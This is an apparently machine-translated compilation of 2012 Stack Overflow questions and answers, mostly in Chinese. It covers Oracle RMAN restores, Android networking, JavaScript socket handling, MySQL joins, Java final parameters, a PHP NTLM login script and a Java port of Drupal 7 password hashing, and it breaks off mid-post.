File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o4nbknav_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o8nbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted 
```

the file is not corrupted as I checked the checksum on both the servers and it is the same.

Please help me how can I restore the RMAN oracle 10g backup in Oracle 11g and let me know where I am going wrong.

Thanks in advance.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:33:30.643

你不能做这个。AFAIK，Solaris - 假设 sparc - 和 Linux - 假设 Intel - 具有不同的字节序格式，这是你的问题。您可以使用迁移跨平台表空间方案。请参阅[Oracle® 数据库备份和恢复参考](http://docs.oracle.com/cd/E11882_01/backup.112/e10643/rcmsynta012.htm#i88628) 如果您的 endian 格式确实看起来相同，则应使用 rman convert database 转换数据库。在这种情况下，您可以恢复跨平台和跨版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-02T15:49:54.660

不适用于 10g/11g，但这在 12c 中有所不同：

在 12c 中，rman 通过备份命令提供以下选项：

> FOR TRANSPORT：此选项创建一个可以传输到任何目的地的备份集。如果目标数据库使用与源不同的字节序格式，则在目标数据库上执行字节序格式转换。TO PLATFORM：此选项导致在源数据库上执行字节序格式转换，并且只能由该支持的平台使用。DATAPUMP：这指定在执行跨平台备份时创建数据泵导出转储文件。转储文件是在单独的备份集中创建的。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2019-05-01T23:12:22.473

使用下面的命令从自动备份恢复，RMAN 知道路径并且它会恢复。

```
restore controlfile from autobackup; 
```

您首先需要知道从 Solaris 到 Linux 是否属于同一字节序。我看到 Solaris 64 但和 Linux 64 位是相同的字节序。

即使它具有相同的字节序，当“源生产数据库具有 32KB 表空间和为 db_32k_cache_size 定义的初始化参数，但目标 pfile 没有定义参数 db_​​32k_cache_size”时，您也会看到此错误

在目标 db_32k_cache_size 的 pfile/spfile 中设置

# ios4 - 如何更改 iOS 4 中位置管理器权限的默认消息？

> ID：11736517
> 
> 赞同：0
> 
> 时间：2012-07-31T08:57:43.383
> 
> 标签：ios4, dialog, message, cllocationmanager

我得到一个对话框说：

> “我的应用”想使用您当前的位置

我想更改此消息。我不想添加任何东西。我只想更改此消息。locationmanager set purpose 会向它添加一条消息，这是我不想要的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-11T15:14:24.460

我认为没有办法改变这条信息。这是 iOS 在每个使用位置服务的应用程序上显示的默认消息，并且对于所有应用程序都是相同的。

# java - Java 正则表达式以逗号分隔但忽略注释中的逗号

> ID：11736524
> 
> 赞同：3
> 
> 时间：2012-07-31T08:58:21.797
> 
> 标签：java

我需要正则表达式用逗号（，）分割字符串，但忽略评论部分中的逗号我在更改你的正则表达式后尝试了很多。它不成功，例如。

```
Command=RTRV-EQPT, Completion Code= DENY, Error Code= II:AC, Problem Description=  /* Input Inva,lid *******ACcess =iden:tifier */, Comment=null, 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:29:34.803

不要重新发明轮子：[这是一个易于使用的解析器](http://pwm.googlecode.com/svn-history/r351/trunk/pwm/servlet/src/password/pwm/util/csv/CsvReader.java)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:32:54.413

对于您的特定情况，为什么不先删除评论然后拆分，它可能会简化您的问题。

```
txt.replace("/*reg to match the comment here */", " ").split(','); 
```

# klout - Klout的影响者和影响者

> ID：11736525
> 
> 赞同：-1
> 
> 时间：2012-07-31T08:58:23.380
> 
> 标签：klout

如果 Klout 说我在 Twitter 上影响了 10 个人，我会看到他们按数字分数的降序排列。这个分数是附加到每个人的 Klout 分数，还是我影响他们的程度？

如果是前者，我如何确定后者的分数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:15:30.593

这是那个人的 Klout 分数。

# android - Android HttpClient：NetworkOnMainThreadException

> ID：11736530
> 
> 赞同：3
> 
> 时间：2012-07-31T08:58:50.993
> 
> 标签：android, networkonmainthread

我在下面有一些代码：

```
protected void testConnection(String url) {
    DefaultHttpClient httpclient = new DefaultHttpClient();
    HttpGet httpget = new HttpGet(url);
    ResponseHandler<String> responsehandler = new BasicResponseHandler();

    try {
        String connection = httpclient.execute(httpget, responsehandler);
        Toast.makeText(getBaseContext(), R.string.connection_succeed, Toast.LENGTH_SHORT).show();
        view_result.setText(connection);
    } catch(IOException e) {
        Toast.makeText(getBaseContext(), R.string.connection_failed, Toast.LENGTH_SHORT).show();
    }
    httpclient.getConnectionManager().shutdown();
} 
```

并在 Menifest 中添加权限：

```
<uses-permission android:name="android.permission.INTERNET"/> 
```

但它有一个例外：NetworkOnMainThreadException，我该怎么办？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:01:48.053

在 ICS 和更高版本上，您不能再在 UI 线程上执行网络操作。相反，你被迫创建一个新线程并在那里做你的网络工作。

可能的工具是 Android`AsyncTask`和普通的 Java `Thread`。

可以在这里找到一个很好的教程：[Android Threads, Handlers and AsyncTask - Tutorial](http://www.vogella.com/articles/AndroidBackgroundProcessing/article.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:01:21.583

**从 API 11 开始，您不能在主**线程上操作网络（耗时）操作。使用`AsyncTask`或`Thread`执行此类操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:02:39.887

从 android Api Level 11 开始，您不能在事件线程中执行网络操作。相反，您应该在事件线程之外的另一个线程中执行网络操作，并使用 Handler 或 Asynctask 来执行此操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T10:10:25.217

我在 android 2.x 及其较低版本中运行您的代码，我认为此代码将完美运行。但是如果你在 3.x 中运行它并且它是更高版本，那么你会得到一个异常。问题是您需要从工作线程(AsyncTask<>) 调用 Web 服务。您不能从主线程调用 Web 服务。

# ip - Skype API 获取主机信息

> ID：11736531
> 
> 赞同：1
> 
> 时间：2012-07-31T08:58:52.443
> 
> 标签：ip, host, skype

我正在用 c# 开发一个应用程序，该应用程序需要特定 Skype 用户的主机名或 IP 地址，以便我的服务器基础设施可以通过他们的 Skype 消息会话，为我的一名员工将与之交谈的特定客户适当地建立自己。

我在互联网上进行了一些研究，以找到这些可用于恶意目的的“Skype 解析器”服务，我向你保证这不是我的意图，但是，由于我不支持恶意活动，我宁愿建立自己的方法来使用 Skype 用户名获取 IP 地址，而不是通过使用他们的工具来支持这些恶意组织。

那么我需要做什么才能从 Skype 用户名中获取这些 IP 地址？

# jquery-ui - 使用 jquery ui 可调整大小、可拖动和 nicEdit 时遇到问题

> ID：11736533
> 
> 赞同：0
> 
> 时间：2012-07-31T08:59:00.233
> 
> 标签：jquery-ui, nicedit

我想创建一些可调整大小和可拖动的 div 标签，其中包含带有 jQ​​ueryUI 的 textarea 标签。我还想使用 nicEdit 来格式化这些 textarea 标签内的文本。但我不能组合它们，也许。如果我不能编辑文本使用 $(element).resizeable().draggable()。这是我的代码：

```
<html>
<head>
<title>Trouble using  jquery ui resizeable, draggable and nicEdit</title>
<link rel="stylesheet" href="css/jquery-ui.css" type="text/css" />
<script src="nicEdit/nicEdit.js" type="text/javascript"></script>
<script type="text/javascript" src="js/jquery-1.7.2.js"></script>
<script type="text/javascript" src="js/jquery-ui-latest.js"></script>
<script type="text/javascript">

$(document).ready(function(){
var btnlist=['fontSize','fontFamily',
                'bold','italic','underline','strikeThrough',
                'left','center','right','justify',
                'ol','ul','hr',
                'indent','outdent',
                'forecolor','bgcolor',
                'subscript','superscript','removeformat'];

var myNicEditor = new nicEditor({iconsPath : 'nicEdit/nicEditorIcons.gif',buttonList     :btnlist });
myNicEditor.setPanel('myNicEdit');  
function ID()
{
var id="id";
var random_number=Math.round(Math.random()*1000000);
id+=random_number;
return id;
}

$('#a').click(function(){
  var id=ID();
  $('#content').append('<div class="d" style="width: 100px;height:100px;"><textarea        style="width:100%;height: 100%" id='+id+'></textarea></div>');
myNicEditor.addInstance(id);
jQuery('.d').draggable().resizable();//If i remove this line,it work ok.
});

}); 
</script>
</head>
<body>
<div>
<button id="a">Add</button>
<div id="myNicEdit" style="width: 200px;" ></div>
<br />
<div id="content">
</div> 
```

谁能给我一些解决方案！非常感谢！

```
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T06:29:06.907

您需要在应用可拖动时添加“句柄”选项，这样它就不会劫持所有子元素上的 onmousedown 事件。

# javascript - extjs 网格真正完整的后渲染事件？

> ID：11736537
> 
> 赞同：0
> 
> 时间：2012-07-31T08:59:24.427
> 
> 标签：javascript, events, extjs, grid

我有 extjs GridPanel

当我加载商店时：

```
I do Ext.getBody().mask();

Grid 'afterrender' event fires first

Store 'load' event fires second

I attached unmask function to  store load 'event' 
```

但是在那次事件之后不久，当我看到白色网格（在取消屏蔽和填充行之间）时。

在真正的完整后渲染事件中揭露的正确方法是什么？我的意思是 - 当所有行都被渲染时。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T15:40:11.793

我打算按照文档中的说明建议 gridview[的](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.grid.View-cfg-loadMask)`loadMask`配置。但我注意到由于某种原因它对我不起作用。

如果它也不适合您，只需使用[此处](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.grid.View-event-refresh)`refresh`介绍的 gridview 事件。它只会在数据完全加载到网格后触发。您可以像这样通过网格面板的配置附加它：`viewConfig`

```
Ext.create('Ext.grid.Panel', {
    title: 'My Grid Panel',
    // ... other grid panel configs
    viewConfig: {
        listeners: {
            refresh: function(gridview) {
                console.log(gridview);
                console.log('is fully loaded');
            }
        }
    },
}); 
```

或者，如果您使用的是 MVC 应用架构：

```
Ext.define('MyApp.controller.MyController', {
    extend: 'Ext.app.Controller',

    models: ['MyModel'],

    stores: ['MyStore'],

    views:  ['MyGridPanel'],

    init: function() {
        var me = this;

        me.control({

            // ... other event handlers

            'mygridpanel > gridview': {

                refresh: function(gridview) {
                    console.log(gridview);
                    console.log('is fully loaded');
                }

            },
        });
    }
}); 
```

# javascript - 强制 javascript 代码同步

> ID：11736539
> 
> 赞同：3
> 
> 时间：2012-07-31T08:59:31.733
> 
> 标签：javascript, websocket

我有一个异步函数（关闭套接字），当用户离开页面时我必须执行它。我试图通过 jQuery 做到这一点：

```
$(window).unload(function() {
   socket.disconnect();
}); 
```

但是，这不起作用，因为该函数是异步的，并且客户端一到达方法的末尾就离开页面，也就是说立即并且不执行断开套接字的请求。

`socket.disconnect()`我们可以提供在函数执行结束时执行的回调。也许这可以帮助...

javascript中有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:11:58.513

我会伸出脖子说我不相信这是可行的 - 至少不是跨浏览器。

正如有人建议的那样，您可以通过中断导航，`onbeforeunload`但这不是在同一个跨浏览器中实现的，即使您可以中断它，您也无法（我相信）捕获用户的去向，例如，在您的套接字关闭中回调，然后您可以转发它们。

一个不理想的妥协可能是用于`onbeforeunload`至少提示他们手动断开与服务器的连接。许多人会；那些没有的你可以通过服务器端检测来获取。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:08:20.477

```
window.onbeforeunload = function () {
    socket.disconnect();
    return 'This will disconnect all connections'; //Throws a prompt to user
}; 
```

更新：我没有看到这行不通。

**有没有办法强制它同步？**

大概..

```
var complete = false;

socket.on('disconnect', function () {
    complete = true;
});

while(!complete){
    //do nothing
} 
```

就我而言，我这样做..

```
$.ajax({
    async: false    
}); 
```

哪个适用于`onbeforeunload`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T12:37:57.963

它现在可以在我的本地版本中使用，因为我已降级到 socket.io 0.9.4。这确实是一个错误。现在它也不适用于我的主机（Heroku），它也有 0.9.4 版本（我配置了它）。

我不知道该怎么做才能解决这个问题，但是是的，至少它在本地工作......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T09:04:58.440

也许您可以尝试使用“beforeunload”事件而不是“unload”，就像[那里](https://stackoverflow.com/questions/4812686/closing-websocket-correctly-html5-javascript)一样，但我认为没有办法通过另一种方式延迟窗口关闭。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-28T02:20:01.753

看看我有一个类似的问题，原来`socket.io`from `0.9.5`to有一个错误`0.9.9`。

[这是](https://stackoverflow.com/questions/12043893/socket-io-force-a-disconnect-over-xhr-polling/12059108#12059108)我的问题的链接。希望这可以帮助。

# r - 如何使用dlply将包结构的断点功能应用于数据子集？[R]

> ID：11736540
> 
> 赞同：0
> 
> 时间：2012-07-31T08:59:31.837
> 
> 标签：r, plyr, piecewise

出色地，

我尝试对我的数据进行一些分段回归，以找到每个 ID 的最终断点并提取此信息。

示例：我的个人数据的子集

```
 ID     time     y
7G009   0       9
7G009   108,33  13
7G009   185,69  16
7G009   309,22  20
7G009   515,08  21
7G051   0       10
7G051   108,33  14
7G051   185,69  19
7G051   309,22  23
7G051   515,08  25
8S027   0       8
8S027   108,33  13
8S027   185,69  17
8S027   309,22  22
8S027   515,08  23 
```

为此，我使用了 strucchange 和 dlply 包的断点功能，我的代码如下：

```
breakby=dlply(test,.(subject),summarize,break=breakpoints(y~time,h=2)) 
```

但我收到一个错误：

```
Erreur dans breakpoints.formula(nbf ~ cumggd, h = 2) :
minimum segment size must be greater than the number of regressors 
```

好吧，如果有人能告诉我如何处理它

先感谢您。

对不起英语不好。

# mysql - 在 MySQL 中实现以下操作的更好方法？

> ID：11736541
> 
> 赞同：0
> 
> 时间：2012-07-31T08:59:34.363
> 
> 标签：mysql, sql, database

我得到一个价格如下的选项列表：（它是按价格 asc 排序的选择查询的结果）

```
 price   color   quanlity
o_id            
1     2     R       medium 
3     3     G       bad
4     4     G       good
5     6     B       good
2     8     R       medium 
```

现在我需要根据要求配对这些选项：

例如，如果我需要 2 R（红色）和 4 G（绿色）

我想返回一个可能的组合列表（按价格升序排序），例如：

```
 R(2)    G(4)    
c_id    o_id    o_id    total price
1          1    3       16
2          1    4       20
3          2    3       28
4          2    4       32 
```

我目前的解决方案是对数据库进行多次查询：

（我在应用层/后端使用 Java。）

1.  选择不同的颜色，并将其存储在列表中
2.  在 For 循环中，将每种颜色的选项选择到不同的临时表中
3.  加入表列表，并计算总数，按总数排序。

但是有没有办法将上述操作浓缩成一个存储过程或更优雅的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:40:11.800

你只需要一个简单的自加入：

```
SELECT   R.o_id AS R_id, G.o_id AS G_id, 2*R.price + 4*G.price AS total
FROM     mytable R JOIN mytable G ON R.color = 'R' AND G.color = 'G'
ORDER BY total 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/a95c1/1/0)上查看。

# java - 在 Java 中使用“final”作为方法参数

> ID：11736543
> 
> 赞同：2
> 
> 时间：2012-07-31T08:59:38.470
> 
> 标签：java, methods, parameters, final

我感兴趣地阅读了这个问题： [我可以在 Java 中通过引用传递参数吗？](https://stackoverflow.com/questions/1068760/can-i-pass-parameters-by-reference-in-java)

结果是参数（不是原语）是通过复制参考值来传递的。正如示例所述；你不能修改你给的参数的引用：

```
Object o = "Hello";
mutate(o)
System.out.println(o); // Will print Hello

private void mutate(Object o) { o = "Goodbye"; } //NOT THE SAME o! 
```

这种问题可以避免使用`final`这样的：

```
private void mutate(final Object o) { o = "Goodbye"; } //Compilation error 
```

问题：

*   这种情况下的`final`关键字是否仅用于引发编译错误？
*   如果最后你不能修改给定参数的引用，为什么不是`final`隐式或强制的？

我很少将`final`Java 中的方法参数用于方法参数，但现在我想不出你会自愿省略放入`final`方法参数的任何情况。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:06:14.850

为了避免这种情况：

```
public void searchBiggest(String startingWith) {
    for (String s : collection) {
        if (s.startsWith(startingWith)) {
            startingWith = s;
        }
    }
    return startingWith;
} 
```

如您所见，它使代码不直观，因为参数可能包含与传递的值不同的值。

来自[Hard Core Java - 第 2 章](http://www.java.net/external?url=http://www.oreilly.com/catalog/hardcorejv/chapter/ch02.pdf)：

> 像这样的小错误通常是最难找到的。根据墨菲定律，你绝对可以保证这段代码会出现在你项目的一大块中间，而且错误报告不会直接把你带到这里。更重要的是，您可能不会注意到错误的影响，直到它投入生产并且用户尖叫着要修复。
> 
> 你不能忘记，一旦你写了代码，故事还没有结束。人们会在您的代码中进行更改、添加和错误。您将不得不查看代码并修复所有被搞砸的东西。为防止发生此问题，请执行以下操作：

并且使用该参数完成了类似的示例，并使用该参数另外调用其他方法（已更改）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T09:05:01.553

通常你不应该修改参数，因为它会引入难以发现的错误。但是，有一些有用的习语和情况可能会很有用：

```
public void print(String msg, int count) {
    msg = (msg != null)? msg : "Default";
    while(--count >= 0) {
        System.out.println(msg);
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T09:01:26.107

我通常这样做是为了防止*意外*或意外*修改*此参考。例如

```
private String doSomething(final String arg) {
   // final to prevent me doing something stupid!
} 
```

一个有趣的场景是在二传手中。您要确保设置成员变量而*不是传入的 arg*。例如

```
public void setArg(String arg) {
   _arg = arg;
} 
```

在上述场景中，如果方法参数**不是**最终的，那么我可以设置

```
 arg = arg; 
```

因为失误。以上是一个常见的错字，或者可能由于搜索/替换重构而发生。通过制作`arg`final，您不会意外地重新分配它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-31T09:12:39.440

**1.** You are passing the `Object Reference Variable` as the **Argument, when you invoked the method by calling it.**

```
 mutate(o); 
```

**2.** By using the `final` keyword on the `Parameter` in the Method Definition, you have **made it final**, So it means that **local Object Reference Variable** `o` which is of **type Object is final**, so **this variable can't be used to point any other object.**

(**Note:** Its the `Object Reference Variable` which is `final`, **Not the Object on the HEAP**)

`mutate(final Object o)`

**3.** You can **assign the object associated with the Object Reference Variable o to some other Object Reference Variable and then change it**.

```
Object i = o;
 i = "GoodBye"; 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-07-31T09:03:52.900

Java 按值传递。因此，当您调用 mutate 时，会传递 o 的副本。

在 mutate 内部，o 的副本然后被设置为指向“再见”。原来的o不变。

将参数设置为 final 不会改变这一点，但正如您所见，它将停止重新分配原始引用的副本。然而，这与停止重新分配原始引用不同。

# php - Apache2、PHP：创建自动ntlm登录页面

> ID：11736544
> 
> 赞同：3
> 
> 时间：2012-07-31T08:59:38.893
> 
> 标签：php, apache2, ntlm

我有带有 PyAuthenNTLM2 模块的 Apache2（请参阅[https://github.com/Legrandin/PyAuthenNTLM2](https://github.com/Legrandin/PyAuthenNTLM2)）。这个 Apache 模块将 windows 用户名放在 $_SERVER['REMOTE_USER'] 中。

要启用此功能，您需要在 apache config（或 htaccess）中为文件或目录添加类似于以下指令的指令：

```
Order allow,deny
Allow from all

AuthType NTLM
AuthName "Test"
require valid-user

PythonAuthenHandler pyntlm
PythonOption Domain TESTDOMAIN
PythonOption PDC 192.168.0.10 
```

问题是，只有在浏览器提供 NTLM 凭据时，才能访问此类目录下的任何文件（包括 css、js）。因此，在非页面中使用受“ntlm 保护”的包含将不起作用。

无论如何，我想要的是一个设置会话并使用会话完成进一步授权的单个页面。如果会话尚未设置或过期，则用户将被无形地转移到自动登录页面，然后返回实际请求的页面。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T10:39:57.243

我想出了以下脚本/解决方案：

```
<?php

$validApplications = array("Application_1", "Application_2");
$baseUrl = 'http://' . $_SERVER["SERVER_NAME"] . '/';

if(!isset($_SERVER["REMOTE_USER"])){
    header('HTTP/1.1 401 Not Authorized', true, 401);
    //...display error page
    exit(0);
}

if(!isset($_GET["applicationName"]) 
        || !in_array($_GET["applicationName"], $validApplications) ){
    header('HTTP/1.1 400 Bad Request', true, 400);  
    //...display error page
    exit(0);
}

$application = $_GET["applicationName"];

if(!isset($_GET["returnTo"])){
    $returnTo = $baseUrl . $application . "index.php";
} else {
    $returnTo = $_GET["returnTo"];
}

$sessionName = "PHP" . $application . "Session";

session_name($sessionName);
session_start();

session_regenerate_id(TRUE);
/* erase data carried over from previous session */
$_SESSION=array();
$_SESSION['login'] = $_SERVER['REMOTE_USER'];
header("Location: " . $returnTo);
?> 
```

这个脚本，我们称之为 login.php 必须在一个相应的 Apache2 模块下，该模块可以设置 $_SERVER["REMOTE_USER"] （我使用 PyAuthenNTLM2），就像我的问题中显示的那样。

然后，应用程序中的每个网页必须首先检查是否设置了 $_SESSION['login'] ，如果没有则重定向到此登录页面：

```
if (!isset($_SESSION['login'])) {
    $queryString = "returnTo=" . urlencode($_SERVER["REQUEST_URI"]) . "&applicationName=Application_1";
    header ("location: " . $baseUrl . "login.php?" . $queryString);
    exit(0);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T12:12:40.277

我已经使用 Apache 和 PHP 完成了这项工作，您需要查看会话处理。“python 会话处理”的快速谷歌返回了各种示例

# android - 带有列表视图和列表项的自定义对话框在备用项目中具有不同的背景？

> ID：11736553
> 
> 赞同：0
> 
> 时间：2012-07-31T09:00:14.127
> 
> 标签：android, listview, dialog, android-dialog, customdialog

我正在创建一个自定义对话框，其中包含两个图像作为标题和对话框内的列表视图。在那个列表视图中有一些我正在显示的项目，现在我希望列表视图中的项目应该获得不同的背景？就像假设我有 5 个项目要在列表视图中显示，那么位置 1,3,5 的项目与位置 2,4 的项目具有不同的背景。可能吗？帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:11:04.027

在列表视图中加载项目时，您可以使用自定义适配器。

为列表视图中的项目创建布局 xml 并进行设置。

像 myitemlist_row.xml 和在活动中：

```
MyAdapter _adapter = new MyAdapter(getActivity().getApplicationContext(), R.layout.myitemlist_row, null, uiBindFrom, uiBindTo, CursorAdapter.FLAG_REGISTER_CONTENT_OBSERVER, this);
_mylist.setAdpater(_adapter); 
```

适配器的示例代码：

```
@Override 
public void bindView(View view, Context context, Cursor cursor) 
{ 
    super.bindView(view, context, cursor); 

    ViewHolder holder = (ViewHolder)view.getTag(); 

    if (holder == null) 
    { 
        holder = new ViewHolder(); 
        holder.Background_Layout = (LinearLayout) view.findViewById(R.id.Background_Layout);
    }

    //you can use now holder.Background_Layout.setBackgroundColor or setBackgroundDrawable accordind to the data, as you want 
```

希望能帮助到你 ：-）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:12:01.730

试试这个，假设您使用的是适配器...

```
public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    if(convertView==null){
        vi = inflater.inflate(R.layout.<item_layout>, null);

    }
    else
    if(pos%2==0)
         vi.setBackgroundResource(<image_1_res_id>);
    else
         vi.setBackgroundResource(<image_2_res_id>);
    return vi;
} 
```

# asp.net - 在 ashx 处理程序获取文档时向用户显示“加载”反馈

> ID：11736554
> 
> 赞同：1
> 
> 时间：2012-07-31T09:00:25.960
> 
> 标签：asp.net, asp.net-ajax

我有一个简单的 ASPX 页面，其中包含指向存储在 SQL Server 数据库中的文档的链接列表。

单击页面上的链接时，将调用 ASHX 处理程序，该处理程序从数据库中检索文档并使用二进制写入响应将其提供给用户

对于较大的文档，我想向用户提供一些反馈，以便他们知道文档即将到来。但是，由于下载文档的是 ashx 处理程序，我不确定我将如何执行此操作。

# java - Drupal 密码的 Java autentication

> ID：11736555
> 
> 赞同：3
> 
> 时间：2012-07-31T09:00:31.127
> 
> 标签：java, drupal, authentication, salt

我尝试模仿 Drupal 7 在 Java 中检查正确密码的方式。在这里找到了一些代码作为指导：[https](https://github.com/CraftFire/AuthDB-Legacy/blob/master/src/main/java/com/authdb/scripts/cms/Drupal.java) ://github.com/CraftFire/AuthDB-Legacy/blob/master/src/main/java/com/authdb/scripts/cms/Drupal.java并提取了我需要的代码。

然而，当我给出密码和散列版本（为了提取盐和所需的迭代量）时，我得到了不同的结果。

密码是使用 Drupal 密码哈希脚本生成的，结果如下：

```
Expected   value = $S$DxVn7wubSRzoK9X2pkGx4njeDRkLEgdqPphc2ZXkkb8Viy8JEGf3
Calculated value = $S$DxVn7wubSpQ1CpUnBZZHNqIXMp2XMVZHMYBqAs24NsUHMY7HBkYn

Expected   value = $S$DOASeKfBzZoqgSRl/mBnK06GlLESyMHZ81jyUueEBiCrkkxxArpR
Calculated value = $S$DOASeKfBzs.XMVZ1NkYXNmIqMpEHAoEaMYJ1NmUHCZJaBZFnAZFX 
```

任何人都可以帮助我/告诉我我在这里做错了什么？谢谢。

代码：

```
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

class test {

  public static void main(String args[]) {
   // Passwords and hashes generated by Drupal.
   checkPassword("test"  , "$S$DxVn7wubSRzoK9X2pkGx4njeDRkLEgdqPphc2ZXkkb8Viy8JEGf3"); 
   checkPassword("barbaz", "$S$DOASeKfBzZoqgSRl/mBnK06GlLESyMHZ81jyUueEBiCrkkxxArpR");
  }

  private static String itoa64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  private static final int DRUPAL_HASH_LENGTH = 55;
  private static int password_get_count_log2(String setting) { return itoa64.indexOf(setting.charAt(3)); }

  /**
   * Note: taken from the default Drupal 7 password algorithm
   * @param candidate
   *        the clear text password
   * @param saltedEncryptedPassword
   *        the salted encrypted password string to check => NEEDS TO BE THE DEFAULT DRUPAL 7 PASSWORD HASH.
   * @return true if the candidate matches, false otherwise.
   */
  public static boolean checkPassword(String candidate, String saltedEncryptedPassword) {
    if (candidate == null) {
      return false;
    }
    if (saltedEncryptedPassword == null) {
      return false; 
    }

    String hash = password_crypt(candidate, saltedEncryptedPassword);
    System.out.println("Tested value = " + saltedEncryptedPassword);
    System.out.println("Calced value = " + hash);

    return hash == saltedEncryptedPassword;
  }

  public static String SHA512(String text) {
    byte[] sha1hash = new byte[40];
    try {
      MessageDigest md = MessageDigest.getInstance("SHA-512");
      md.update(text.getBytes("UTF-8"), 0, text.length());
      sha1hash = md.digest();
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } catch (UnsupportedEncodingException e) {
      e.printStackTrace();
    }
    return convertToHex(sha1hash);
  }

  private static String convertToHex(byte[] data) {
    StringBuffer buf = new StringBuffer();
    for (int i = 0; i < data.length; i++) {
      int halfbyte = (data[i] >>> 4) & 0x0F;
      int two_halfs = 0;
        do {
          if ((0 <= halfbyte) && (halfbyte <= 9))
            buf.append((char) ('0' + halfbyte));
          else
            buf.append((char) ('a' + (halfbyte - 10)));
            halfbyte = data[i] & 0x0F;
      }
      while(two_halfs++ < 1);
    }
    return buf.toString();
  }

  private static String password_crypt(String password, String setting) {
    // The first 12 characters of an existing hash are its setting string.
    setting = setting.substring(0, 12);
    int count_log2 = password_get_count_log2(setting);

    String salt = setting.substring(4, 12);
    // Hashes must have an 8 character salt.
    if (salt.length() != 8) {
      return null; 
    }

    // Convert the base 2 logarithm into an integer.
    int count = 1 << count_log2;

    String hash;
    try {
      hash = SHA512(salt + password);
      do {
        hash = SHA512(hash + password);
      } while (--count >= 0);
    } catch(Exception e) {
      return null; 
    }

    int len = hash.length();
    String output = setting + password_base64_encode(hash, len);         
    return (output.length() > 0) ? output.substring(0, DRUPAL_HASH_LENGTH) : null;
  }

  private static String password_base64_encode(String input, int count) {
    StringBuffer output = new StringBuffer();
    int i = 0, value;
    do {
      value = input.charAt(i++);
      output.append(itoa64.charAt(value & 0x3f));
      if (i < count) {
        value |= input.charAt(i) << 8;
      }
      output.append(itoa64.charAt((value >> 6) & 0x3f));
      if (i++ >= count) {
        break;
      }
      if (i < count) {
        value |= input.charAt(i) << 16;
      }
      output.append(itoa64.charAt((value >> 12) & 0x3f));
      if (i++ >= count) {
        break;
      }
      output.append(itoa64.charAt((value >> 18) & 0x3f));
    } while (i < count);
    return output.toString();
  }

} 
```

——附言。我已经看到的一件事如下：考虑这些功能：

```
 public String convertToHex(byte[] data) {
    StringBuffer buf = new StringBuffer();
    for (int i = 0; i < data.length; i++) {
      int halfbyte = (data[i] >>> 4) & 0x0F;
      int two_halfs = 0;
        do {
          if ((0 <= halfbyte) && (halfbyte <= 9))
            buf.append((char) ('0' + halfbyte));
          else
            buf.append((char) ('a' + (halfbyte - 10)));
            halfbyte = data[i] & 0x0F;
      }
      while(two_halfs++ < 1);
    }
    return buf.toString();
  } 
```

和

```
 public String convertToHex(byte [] raw) {
      StringBuilder hex = new StringBuilder(2 * raw.length);
      for (final byte b : raw) {
         int hiVal = (b & 0xF0) >> 4;
         int loVal = b & 0x0F;
         hex.append((char) ('0' + (hiVal + (hiVal / 10 * 7))));
         hex.append((char) ('0' + (loVal + (loVal / 10 * 7))));
      }
      return hex.toString();
   } 
```

第一个函数以小写形式返回字符串，第二个函数以大写形式返回。不知道该使用哪个，最终两者都返回不同的结果，但都不令人满意。

-编辑-

差不多好了？？？...

更进一步，稍微改变了问题......在 Drupal 中使用了以下函数：

```
$hash = hash($algo, $salt . $password, TRUE); 
```

返回

```
'���Y�emb
ӈ3����4��q����h�osab��V�!IS�uC�*[� 
```

如您所见，我们不需要十六进制版本，因为您得到了完全不同的哈希值...所以我更改了 java 中的代码：

```
 public byte[] SHA512(String text) {
    byte[] sha1hash = new byte[50];
    try {
      MessageDigest md = MessageDigest.getInstance("SHA-512");
      md.update(text.getBytes("UTF-8"), 0, text.length());
      sha1hash = md.digest();
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } catch (UnsupportedEncodingException e) {
      e.printStackTrace();
    }
    return sha1hash;
  }

 --snip--
  hash = new String(SHA512(salt + password));
  System.out.println(hash); 
```

返回：

```
